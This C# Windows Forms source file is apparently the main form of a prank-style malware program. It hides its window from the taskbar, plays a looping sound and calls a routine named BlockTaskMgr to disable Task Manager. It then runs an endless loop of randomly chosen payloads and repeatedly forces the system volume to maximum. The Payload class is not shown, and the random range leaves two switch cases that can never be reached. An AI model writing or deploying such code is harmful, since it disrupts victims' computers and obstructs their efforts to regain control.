using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Runtime.InteropServices;

namespace Karolak
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        public static extern IntPtr SendMessageW(IntPtr Hwnd, int Msg, IntPtr wParam, IntPtr lParam);

        public const int APPCOMMAND_VOLUME_UP = 0xA000;
        public const int WM_APPCOMMAND = 0x319;

        public Form1()
        {
            Random random = new Random();
            int x = random.Next(0, 1270);
            int y = random.Next(0, 920);

            this.StartPosition = FormStartPosition.Manual;
            this.Location = new Point(x, y);
            this.ShowInTaskbar = false;

            InitializeComponent();

            new Thread(() =>
            {
                SoundPlayer player = new SoundPlayer(Properties.Resources.sound);
                player.PlayLooping();
            }).Start();
            RandomPayload();
        }

        public void RandomPayload()
        {
            Payload payload = new Payload();
            payload.BlockTaskMgr();
            while (true)
            {
                Random random = new Random();
                int x = random.Next(1, 17);
                switch (x)
                {
                    case 1:
                        payload.payload1();
                        break;
                    case 2:
                        payload.payload2();
                        break;
                    case 3:
                        VOL();
                        break;
                    case 4:
                        payload.payload3();
                        break;
                    case 5:
                        payload.payload4();
                        break;
                    case 6:
                        payload.payload5();
                        break;
                    case 7:
                        payload.payload6();
                        break;
                    case 8:
                        payload.payload7();
                        break;
                    case 9:
                        payload.payload8();
                        break;
                    case 10:
                        payload.payload9();
                        break;
                    case 11:
                        payload.payload10();
                        break;
                    case 12:
                        payload.payload11();
                        break;
                    case 13:
                        payload.payload12();
                        break;
                    case 14:
                        payload.payload13();
                        break;
                    case 15:
                        payload.payload14();
                        break;
                    case 16:
                        payload.payload15();
                        break;
                    case 17:
                        payload.payload16();
                        break;
                    case 18:
                        payload.InsertKremowka();
                        break;
                }
                Thread.Sleep(1);
            }
        }

        private void VOL()
        {
            for (int i = 0; i < 20; i++)
            {
                SendMessageW(this.Handle, WM_APPCOMMAND, this.Handle, (IntPtr)APPCOMMAND_VOLUME_UP);
            }
        }
    }
}
